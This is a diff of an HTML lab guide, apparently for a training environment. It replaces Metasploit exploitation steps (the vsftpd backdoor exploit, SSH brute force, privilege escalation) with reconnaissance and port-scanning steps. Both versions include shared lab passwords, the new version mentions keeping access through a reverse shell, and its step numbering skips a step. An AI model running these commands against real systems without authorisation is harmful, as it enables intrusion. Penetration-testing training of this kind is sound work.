@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Metasploit Exploitation Guide</title>
+    <title>Metasploit Exploitation Experiments Instructions</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -11,9 +11,6 @@
             background-color: #f4f4f4;
             margin: 0;
             padding: 20px;
-        }
-        h2, h3 {
-            color: #333;
         }
         .container {
             background-color: white;
@@ -32,58 +29,136 @@
             border-radius: 5px;
             white-space: pre-wrap;
         }
-        ul {
-            list-style-type: disc;
-            padding-left: 20px;
+        h2, h3 {
+            color: #333;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+        ol, ul {
+            margin-bottom: 20px;
+        }
+        ol li, ul li {
+            margin-bottom: 10px;
+        }
+        .step {
+            margin-top: 30px;
+        }
+        .command {
+            margin-top: 15px;
+            font-size: 1.1em;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>Metasploit Exploitation Guide</h2>
-        <p>This guide explains how to exploit vulnerabilities using Metasploit.</p>
-    
-        <h3>Step 1: Login to Both Systems (Perform on Attacker and Victim Systems)</h3>
+
+<div class="container">
+    <h2>Meta-Exploit Vulnerability Scan Instructions</h2>
+    <p>Follow the steps below to perform a vulnerability scan using Metasploit on a specific target, such as the victim system.</p>
+
+    <div class="step">
+        <h3>Step 1: Login to Both Systems</h3>
         <ul>
-            <li><strong>Attacker System:</strong> Username: <code>user</code>, Password: <code>VSecureSphere</code></li>
-            <li><strong>Victim System:</strong> Username: <code>user</code>, Password: <code>VSecureSphere</code></li>
+            <li><strong>Attacker System:</strong> Password: <code>VSecureSphere</code></li>
+            <li><strong>Victim System:</strong> Password: <code>VSecureSphere</code></li>
         </ul>
-    
-        <h3>Step 2: Acquiring Victim's IP (Perform on Victim System)</h3>
-        <p>Run the following command on the victim system:</p>
-        <pre><code>ifconfig</code></pre>
-        <p>Note the IP address assigned to the victim.</p>
-    
-        <h3>Step 3: Scanning Victim (Perform on Attacker System)</h3>
-        <p>Run Nmap from the attacker system:</p>
-        <pre><code>nmap -p 22,21,80,445 &lt;VICTIM-IP&gt;</code></pre>
-    
-        <h3>Step 4: Exploiting FTP Vulnerability (Perform on Attacker System)</h3>
-        <p>Use the following Metasploit commands to exploit the vsftpd vulnerability:</p>
-        <pre><code>
-use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOSTS &lt;VICTIM-IP&gt;
-set RPORT 21
-exploit
-        </code></pre>
-    
-        <h3>Step 5: Exploiting SSH (Brute Force) (Perform on Attacker System)</h3>
-        <p>Use a brute force attack on SSH:</p>
-        <pre><code>
-use auxiliary/scanner/ssh/ssh_login
-set RHOSTS &lt;VICTIM-IP&gt;
-set USERNAME hacker
-set PASSWORD password
-run
-        </code></pre>
-    
-        <h3>Step 6: Privilege Escalation (Perform on Attacker System)</h3>
-        <p>Once a session is obtained, escalate privileges:</p>
-        <pre><code>
-use exploit/linux/local/sudo_bypass
-set SESSION &lt;SESSION-ID&gt;
-exploit
-        </code></pre>
     </div>
+
+    <div class="step">
+        <h3>Step 2: Verify Victim is Running</h3>
+        <ul>
+            <li><strong>Login</strong> to the victim system.</li>
+            <li>Open a terminal and run the following command to verify the IP address:
+                <pre><code>ifconfig</code></pre>
+                <img src="Meta_SS/1.png" alt="Victim System">
+            </li>
+            <li>Ensure that services like Apache (port 80) and OpenSSH (port 22) are running:
+                <pre><code>service apache2 start</code></pre>
+                <pre><code>service ssh start</code></pre>
+                <img src="Meta_SS/2.png" alt="Victim System">
+                <pre><code>service vsftpd start</code></pre>
+                <img src="Meta_SS/3.png" alt="Victim System">
+            </li>
+        </ul>
+        
+    </div>
+
+    <div class="step">
+        <h3>Step 3: Launch Metasploit on the Attacker</h3>
+        <ul>
+            <li>Open a terminal on the attacker system.</li>
+            <li>Run the command to start Metasploit:
+                <pre><code>msfconsole</code></pre>
+            </li>
+            <img src="Meta_SS/4.png" alt="Metasploit Console">
+        </ul>
+        
+    </div>
+
+    <div class="step">
+        <h3>Step 4: Perform Recon on the Victim</h3>
+        <ul>
+            <li>Scan for open FTP version:
+                <pre><code>use auxiliary/scanner/ftp/ftp_version</code></pre>
+                <pre><code>set RHOSTS <victim-ip>  # Replace with the actual victim IP</code></pre>
+                <pre><code>run</code></pre>
+                <img src="Meta_SS/5.png" alt="FTP Version">
+            </li>
+            
+            <li>Check if anonymous FTP login is allowed:
+                <pre><code>use auxiliary/scanner/ftp/ftp_anonymous</code></pre>
+                <pre><code>set RHOSTS <victim-ip>  # Replace with the actual victim IP</code></pre>
+                <pre><code>run</code></pre>
+                <img src="Meta_SS/6.png" alt="Anonymous FTP Login">
+            </li>
+            
+        </ul>
+    </div>
+
+    <div class="step">
+        <h3>Step 5: Perform TCP Port Scan</h3>
+        <ul>
+            <li>Run a TCP port scan on the victim:
+                <pre><code>use auxiliary/scanner/portscan/tcp</code></pre>
+                <pre><code>set RHOSTS <victim-ip>  # Replace with the actual victim IP</code></pre>
+                <pre><code>set THREADS 50</code></pre>
+                <pre><code>set PORTS 1-1000</code></pre>
+                <pre><code>run</code></pre>
+                <img src="Meta_SS/7.png" alt="TCP Port Scan">
+            </li>
+        </ul>
+        
+    </div>
+
+    <div class="step">
+        <h3>Step 6: Perform SYN Scan</h3>
+        <ul>
+            <li>Perform a SYN scan for stealthier port detection:
+                <pre><code>use auxiliary/scanner/portscan/syn</code></pre>
+                <pre><code>set RHOSTS <victim-ip>  # Replace with the actual victim IP</code></pre>
+                <pre><code>set THREADS 100</code></pre>
+                <pre><code>set PORTS 1-1000</code></pre>
+                <pre><code>run</code></pre>
+                <img src="Meta_SS/8.png" alt="SYN Scan">
+            </li>
+        </ul>
+        
+    </div>
+
+    <div class="step">
+        <h3>Step 8: Final Tips</h3>
+        <ul>
+            <li>Validate open ports and services.</li>
+            <li>Use Metasploit payloads to maintain access (e.g., reverse shell).</li>
+            <li>Adjust thread count for faster scanning in larger networks.</li>
+        </ul>
+    </div>
+
+</div>
+
 </body>
 </html>
